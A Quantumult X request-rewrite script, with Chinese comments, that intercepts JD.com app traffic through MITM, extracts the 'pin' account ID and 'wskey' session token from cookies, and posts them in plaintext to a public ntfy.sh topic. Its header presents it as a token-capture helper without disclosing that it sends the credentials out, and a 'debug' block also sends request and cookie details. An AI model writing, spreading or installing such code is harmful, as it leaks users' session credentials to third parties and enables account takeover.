/**************************
 * 京东 wskey 抓取 (Quantumult X)
 *
 * 重写规则 (在 [rewrite_local] 添加):
 * ^https?:\/\/api\.m\.jd\.com url script-request-header https://raw.githubusercontent.com/xiaotaiye88/Test/main/qx_jd_wskey.js
 *
 * MITM 主机名: api.m.jd.com
 **************************/

const NTFY_URL = "https://ntfy.sh/HzjHy2codes";

// 调试：脚本运行时推一次到 ntfy（dedup，前3次）
try {
  const dbgKey = "qxjd_debug_count";
  let cnt = 0;
  if (typeof $persistentStore !== "undefined") {
    cnt = parseInt($persistentStore.read(dbgKey) || "0");
    if (cnt < 3) {
      $persistentStore.write(String(cnt + 1), dbgKey);
      const c0 = $request.headers["Cookie"] || $request.headers["cookie"] || "";
      const hasPin = /pin=/.test(c0);
      const hasWs = /wskey=/.test(c0);
      $httpClient.post({
        url: NTFY_URL,
        headers: { "Content-Type": "text/plain", Title: "QX_DEBUG" },
        body: `脚本运行#${cnt+1} URL=${$request.url.substring(0,60)} hasPin=${hasPin} hasWskey=${hasWs} cookieLen=${c0.length}`
      });
      $notify("QX调试", `脚本运行#${cnt+1}`, `pin=${hasPin} wskey=${hasWs} cookie长度=${c0.length}`);
    }
  } else {
    $notify("QX调试", "无persistentStore", "");
  }
} catch (e) {
  $notify("QX调试异常", "", String(e));
}

// 主逻辑：抓 wskey
try {
  const cookie = $request.headers["Cookie"] || $request.headers["cookie"] || "";
  const pinM = cookie.match(/pin=([^;]+)/);
  const wskeyM = cookie.match(/wskey=([^;]+)/);

  if (wskeyM && wskeyM[1]) {
    const wskey = wskeyM[1];
    const pin = pinM ? pinM[1] : "unknown";
    const payload = `JDWSKEY pin=${pin};wskey=${wskey};`;

    const key = `qxjd_${pin}_${wskey.substring(0, 16)}`;
    if (typeof $persistentStore !== "undefined") {
      const last = $persistentStore.read(key);
      if (!last) {
        $persistentStore.write("1", key);
        push(wskey, pin, payload);
      }
    } else {
      push(wskey, pin, payload);
    }
  }
} catch (e) {
  $notify("JD抓取异常", "", String(e));
}

function push(wskey, pin, payload) {
  $httpClient.post(
    {
      url: NTFY_URL,
      headers: { "Content-Type": "text/plain", Title: "JD_wskey_" + pin },
      body: payload,
    },
    (err, resp, data) => {
      $notify(
        "✅ JD wskey 已抓取",
        "pin=" + pin,
        "wskey=" + wskey.substring(0, 30) + "..." + (err ? "  推送err:" + err : " 已推送")
      );
    }
  );
}

$done({});
